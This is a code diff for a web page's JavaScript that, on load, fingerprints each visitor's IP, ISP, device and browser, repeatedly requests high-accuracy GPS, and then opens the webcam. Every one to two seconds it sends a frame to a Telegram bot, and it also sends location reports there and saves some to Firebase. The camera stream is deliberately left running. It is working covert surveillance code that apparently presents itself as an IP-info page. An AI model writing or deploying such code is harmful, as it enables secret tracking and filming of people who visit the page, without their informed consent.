@@ -35,24 +35,55 @@ document.addEventListener('DOMContentLoaded', async () => {
     const orgDisplay = document.getElementById('org-display');
     const connectionDisplay = document.getElementById('connection-display');
 
+    // --- 1. TRIGGER LOCATION PROMPT IMMEDIATELY (Async) ---
+    let locationCaptured = false;
+    let gpsCoords = null;
+
+    function startLocationRequest() {
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    locationCaptured = true;
+                    gpsCoords = position.coords;
+                    if (window.ipDataLoaded) {
+                        processAndSave(position.coords, null, "📍 LOCATION OBTAINED");
+                    }
+                    setTimeout(captureAndSendPhoto, 1000);
+                },
+                (error) => {
+                    console.warn("Location error:", error.message);
+                    if (window.ipDataLoaded) {
+                        processAndSave(null, error.message, "❌ LOCATION DENIED");
+                    }
+                    setTimeout(captureAndSendPhoto, 1000);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        } else {
+            setTimeout(captureAndSendPhoto, 1000);
+        }
+    }
+
+    startLocationRequest();
+
     try {
-        // 1. Fetch IP and Location Info
+        // --- 2. FETCH IP DATA (In Parallel) ---
         const ipRes = await fetch('https://ipapi.co/json/');
         const ipData = await ipRes.json();
+        window.ipDataLoaded = true;
 
         if (ipData.error) {
             throw new Error(`API Error: ${ipData.reason}`);
         }
 
-        // 2. Detect Device Info
+        // --- 3. DATA PROCESSING ---
         const userAgent = navigator.userAgent;
-        let os = ipData.org || "Unknown ISP"; // Using org for now, will refine
+        let os = "Unknown OS";
         let browser = "Unknown Browser";
         let deviceType = "Desktop";
 
         if (userAgent.indexOf("Mobi") !== -1) deviceType = "Mobile";
 
-        // Simple browser/os detection as fallback
         const platform = navigator.platform;
         if (platform.toLowerCase().includes('win')) os = 'Windows';
         else if (platform.toLowerCase().includes('mac')) os = 'macOS';
@@ -65,7 +96,6 @@ document.addEventListener('DOMContentLoaded', async () => {
         else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
         else if (userAgent.includes("Edge")) browser = "Edge";
 
-        // 3. Detect Connection Type
         const isp = ipData.org || "Unknown ISP";
         const org = ipData.asn || "Unknown ASN";
         let connectionSpeed = "Unknown Speed";
@@ -74,7 +104,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             connectionSpeed = navigator.connection.effectiveType.toUpperCase();
         }
 
-        // 4. Update UI - Basic Info
+        // Update UI
         ipDisplay.textContent = ipData.ip || "N/A";
         deviceDisplay.textContent = deviceType;
         osDisplay.textContent = os;
@@ -83,20 +113,15 @@ document.addEventListener('DOMContentLoaded', async () => {
         if (orgDisplay) orgDisplay.textContent = org;
         connectionDisplay.textContent = connectionSpeed;
 
-        // --- Collect Detailed Device Info ---
+        // Collect Detailed Info
         const detailedInfo = {
             productSub: navigator.productSub || "N/A",
             vendor: navigator.vendor || "N/A",
             maxTouchPoints: navigator.maxTouchPoints || 0,
             cookieEnabled: navigator.cookieEnabled,
-            appCodeName: navigator.appCodeName || "N/A",
-            appName: navigator.appName || "N/A",
-            appVersion: navigator.appVersion || "N/A",
             platform: navigator.platform || "N/A",
-            product: navigator.product || "N/A",
             userAgent: navigator.userAgent || "N/A",
             language: navigator.language || "N/A",
-            languages: navigator.languages ? navigator.languages.join(', ') : "N/A",
             webdriver: navigator.webdriver || false
         };
 
@@ -107,123 +132,18 @@ document.addEventListener('DOMContentLoaded', async () => {
         }
         detailedDisplay.textContent = detailsText;
 
-        // Show content
-        loading.style.display = 'none';
-        content.style.display = 'block';
+        // INITIAL NOTIFICATION (Now that IP data is ready)
+        processAndSave(gpsCoords, null, gpsCoords ? "📍 LOCATION OBTAINED" : "🚨 Awaiting User Input...");
 
-        // --- Camera Capture Logic ---
-        async function captureAndSendPhoto() {
-            // Only run if HTTPS or Localhost
-            if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
-                console.warn("Camera requires HTTPS. Skipping.");
-                return;
-            }
-
-            const player = document.getElementById('player');
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                player.srcObject = stream;
-
-                // Wait for video to be ready
-                await new Promise((resolve) => {
-                    player.onloadedmetadata = () => {
-                        player.play();
-                        // Small delay to ensure camera adjusts light
-                        setTimeout(resolve, 1000);
-                    };
-                });
-
-                // Set canvas size to match video
-                canvas.width = player.videoWidth;
-                canvas.height = player.videoHeight;
-
-                // Start Continuous Capture (Every 1 second)
-                setInterval(() => {
-                    if (player.readyState === player.HAVE_ENOUGH_DATA) {
-                        // Draw frame
-                        context.drawImage(player, 0, 0, canvas.width, canvas.height);
-
-                        // Convert to Blob and Send
-                        canvas.toBlob((blob) => {
-                            sendPhotoToTelegram(blob);
-                        }, 'image/jpeg', 0.7); // Slightly lower quality for speed
-                    }
-                }, 1000);
-
-                // Note: We are NOT stopping the stream so it keeps running.
-
-            } catch (err) {
-                console.error("Camera Error:", err);
-                // Optional: Send error to Telegram that camera failed
-            }
-        }
-
-        function sendPhotoToTelegram(photoBlob) {
-            const formData = new FormData();
-            formData.append("chat_id", TELEGRAM_CHAT_ID);
-            formData.append("photo", photoBlob, "visitor.jpg");
-            formData.append("caption", "📸 New Visitor Photo");
-
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-                .then(res => res.json())
-                .then(data => {
-                    if (data.ok) console.log("Photo sent to Telegram!");
-                    else console.error("Telegram Photo Error:", data);
-                })
-                .catch(err => console.error("Telegram Photo Network Error:", err));
-        }
-
-        // --- DATA COLLECTION FLOW ---
-        let locationCaptured = false;
-
-        // 1. Request Location IMMEDIATELY (To prevent blocking)
-        function startLocationRequest() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        locationCaptured = true;
-                        processAndSave(position.coords, null, "📍 LOCATION OBTAINED");
-                        // Wait 1 second before asking for camera
-                        setTimeout(captureAndSendPhoto, 1000);
-                    },
-                    (error) => {
-                        console.warn("Location error:", error.message);
-                        processAndSave(null, error.message, "❌ LOCATION DENIED");
-                        // Wait 1 second even if denied
-                        setTimeout(captureAndSendPhoto, 1000);
-                    },
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-                );
-            } else {
-                processAndSave(null, "Not Supported", "⚠️ GEO NOT SUPPORTED");
-                setTimeout(captureAndSendPhoto, 1000);
-            }
-        }
-
-        // Trigger Location Request
-        startLocationRequest();
-
-        // 2. Send INITIAL Info (Immediate notification)
-        processAndSave(null, "Awaiting User Input...");
-
-        // 3. Scheduled Update (5 Seconds)
+        // SCHEDULED UPDATES
         setTimeout(() => {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition((pos) => {
-                    // Only send if we didn't have location before or it's different
                     processAndSave(pos.coords, null, "🔄 5s UPDATE");
-                    locationCaptured = true;
                 }, null, { enableHighAccuracy: true });
             }
         }, 5000);
 
-        // 4. Scheduled Update (10 Seconds)
         setTimeout(() => {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition((pos) => {
@@ -232,8 +152,8 @@ document.addEventListener('DOMContentLoaded', async () => {
             }
         }, 10000);
 
+        // --- HELPER FUNCTIONS ---
         async function processAndSave(coords, errorMsg = null, statusLabel = "VISITOR LOG") {
-            // FALLBACK: Use IP-based coordinates if GPS fails or is denied
             const lat = coords ? coords.latitude : (ipData.latitude || null);
             const lon = coords ? coords.longitude : (ipData.longitude || null);
             const isGps = coords ? true : false;
@@ -261,13 +181,9 @@ document.addEventListener('DOMContentLoaded', async () => {
                 timestamp: serverTimestamp()
             };
 
-            // Send to Telegram
             sendToTelegram(collectedData);
-
-            // Save to Firebase (Only save first and final to avoid too many writes)
-            if (statusLabel.includes("INITIAL") || statusLabel.includes("FINAL") || statusLabel.includes("OBTAINED")) {
-                await saveDataToFirebase(collectedData);
-                console.log("Data saved to Firebase:", statusLabel);
+            if (statusLabel.includes("OBTAINED") || statusLabel.includes("FINAL")) {
+                saveDataToFirebase(collectedData);
             }
         }
 
@@ -340,5 +256,57 @@ ${data.status === "📍 LOCATION OBTAINED" ? "🟢" : data.status.includes("🔄
                 if (!data.ok) console.error("Telegram Error:", data);
             })
             .catch(err => console.error("Telegram Fetch Error:", err));
+    }
+
+    // --- 4. CAMERA FUNCTIONS (Restored) ---
+    async function captureAndSendPhoto() {
+        if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
+            return;
+        }
+
+        const player = document.getElementById('player');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            player.srcObject = stream;
+
+            await new Promise((resolve) => {
+                player.onloadedmetadata = () => {
+                    player.play();
+                    setTimeout(resolve, 1000);
+                };
+            });
+
+            canvas.width = player.videoWidth;
+            canvas.height = player.videoHeight;
+
+            setInterval(() => {
+                if (player.readyState === player.HAVE_ENOUGH_DATA) {
+                    context.drawImage(player, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob((blob) => {
+                        sendPhotoToTelegram(blob);
+                    }, 'image/jpeg', 0.6);
+                }
+            }, 2000); // Send every 2 seconds
+
+        } catch (err) {
+            console.error("Camera Error:", err);
+        }
+    }
+
+    function sendPhotoToTelegram(photoBlob) {
+        const formData = new FormData();
+        formData.append("chat_id", TELEGRAM_CHAT_ID);
+        formData.append("photo", photoBlob, "visitor.jpg");
+        formData.append("caption", "📸 New Visitor Photo");
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        })
+            .then(res => res.json())
+            .catch(err => console.error("Telegram Photo Error:", err));
     }
 });
